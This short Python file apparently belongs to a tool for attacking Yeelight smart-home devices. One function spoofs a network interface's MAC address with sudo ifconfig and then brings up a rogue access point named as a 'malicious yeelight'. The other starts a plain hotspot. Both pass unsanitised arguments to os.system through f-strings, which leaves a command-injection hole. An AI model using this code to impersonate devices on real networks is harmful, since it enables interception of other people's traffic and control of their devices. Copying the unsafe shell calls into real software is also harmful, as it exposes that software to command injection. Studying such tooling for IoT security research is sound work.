import os

def create_hotspot(iface, ssid, password):
    create_hotspot_cmd = f"create_ap -n {iface} {ssid} {password} --no-virt"
    os.system(create_hotspot_cmd)

def create_malicious_yeelight(iface, ssid, gateway_ip, new_mac):
    iface_down_cmd = f"sudo ifconfig {iface} down"
    iface_change_mac_cmd = f"sudo ifconfig {iface} hw ether {new_mac}"
    iface_up_cmd = f"sudo ifconfig {iface} up"
    create_malicious_yeelight_cmd = f"create_ap -c 10 -g {gateway_ip} -n {iface} {ssid} --no-virt"
    os.system(iface_down_cmd)
    os.system(iface_change_mac_cmd)
    os.system(iface_up_cmd)
    os.system(create_malicious_yeelight_cmd)
